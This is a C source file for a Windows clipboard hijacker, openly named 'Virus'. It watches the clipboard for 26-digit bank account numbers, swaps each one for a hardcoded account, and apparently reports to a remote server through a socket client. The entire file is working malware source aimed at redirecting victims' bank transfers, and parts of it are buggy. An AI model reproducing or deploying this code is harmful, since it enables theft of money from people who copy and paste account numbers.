#include "Client.h"

char *clipText;
char numerKonta[textSize] = "87105011391000009097888011";
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
HANDLE clip;
int j = 0;
HWND hwndNextVwr;


int check_string(const char* string) {
	const int string_len = strlen(string);
	int validateNumber = string_len;
	for (int i = 0; i < string_len; i++) {
		if (string[i] == ' ')
			validateNumber--;
	}

	if (validateNumber != 26)
		return 0;

	for (int i = 0; i < string_len; ++i) {
		if (!isdigit(string[i]) && string[i] != ' ')
			return 0;
	}
	return 1;
}

HGLOBAL retrieveClipboard(HWND hwnd) {
	if (IsClipboardFormatAvailable(CF_TEXT)) {
		OpenClipboard(hwnd);
		HANDLE hCbMem = GetClipboardData(CF_TEXT);
		HGLOBAL hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
		if (hProgMem != NULL) {
			LPVOID lpCbMem = GlobalLock(hCbMem);
			LPVOID lpProgMem = GlobalLock(hProgMem);
			//lpstrcpy(lpProgMem, lpCbMem);
			GlobalUnlock(hCbMem);
			GlobalUnlock(hProgMem);
			CloseClipboard();
			return hProgMem;
		}
		CloseClipboard();
	}
	return NULL;
}

void changeClipboard(HWND hwnd, char *numerKonta, int size) {
	HGLOBAL hGlMem = GlobalAlloc(GHND, size + 1);
	if (!hGlMem) {
		CloseClipboard();
		return;
	}
	memcpy(GlobalLock(hGlMem), numerKonta, size);
	GlobalUnlock(hGlMem);

	OpenClipboard(hwnd);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hGlMem);
	CloseClipboard();
	GlobalFree(hGlMem);
}

void Virus(HWND hwnd) {
	OpenClipboard(NULL);
	clip = GetClipboardData(CF_TEXT);
	clipText = (char *)GlobalLock(clip);
	CloseClipboard();

	if (check_string(clipText)) {
		sendData(numerKonta);
		changeClipboard(NULL, numerKonta, textSize);
	}
	return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
	PAINTSTRUCT paintStruct;
	HDC hDC;


	switch (message) {
	case WM_CREATE:
		hwndNextVwr = SetClipboardViewer(hwnd);
		return 0;
		break;
		break;

	case WM_DRAWCLIPBOARD:
		if (hwndNextVwr != NULL) SendMessage(hwndNextVwr, message, wParam, lParam);

		Virus(hwnd);
		InvalidateRect(hwnd, NULL, TRUE);
		return(0);

	case WM_CHANGECBCHAIN:
		if (wParam == hwndNextVwr)
			hwndNextVwr = LOWORD(lParam);
		else {
			if (hwndNextVwr != NULL) {
				SendMessage(hwndNextVwr, message, wParam, lParam);
			}
		}
		return(0);
		break;
	case WM_PAINT:
		hDC = BeginPaint(hwnd, &paintStruct);
		SetTextColor(hDC, (COLORREF)0x00FF0000);

		TextOut(hDC, 150, 150, L"Wirus", 5);
		EndPaint(hwnd, &paintStruct);
		return 0;

	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNextVwr);
		PostQuitMessage(0);
		return(0);
	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
	}

	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmdLine, int       nCmdShow) {
	WNDCLASSEX  windowClass;		//window class
	HWND		hwnd;				//window handle
	windowClass.cbSize = sizeof(WNDCLASSEX);
	windowClass.style = CS_HREDRAW | CS_VREDRAW;
	windowClass.lpfnWndProc = WndProc;
	windowClass.cbClsExtra = 0;
	windowClass.cbWndExtra = 0;
	windowClass.hInstance = hInstance;
	windowClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	windowClass.lpszMenuName = NULL;
	windowClass.lpszClassName = "MyClass";
	windowClass.hIconSm = LoadIcon(NULL, IDI_WINLOGO);
	/*	Register window class*/
	if (!RegisterClassEx(&windowClass)) {
		return 0;
	}
	/*	Class registerd, so now create window*/
	hwnd = CreateWindowEx(NULL,		//extended style
		"MyClass",			//class name
		L"A Real Win App",		//app name
		WS_OVERLAPPEDWINDOW |		//window style
		DDL_HIDDEN |
		WS_SYSMENU,
		100, 100,			//x/y coords
		400, 400,			//width,height
		NULL,				//handle to parent
		NULL,				//handle to menu
		hInstance,			//application instance
		NULL);				//no extra parameter's
							/*	Check if window creation failed*/

	if (!hwnd)
		return 0;

	initClient();
	MSG msg;
	while (GetMessage(&msg, (HWND)NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	closesocket(ConnectSocket);
	WSACleanup();
	return msg.wParam;
}
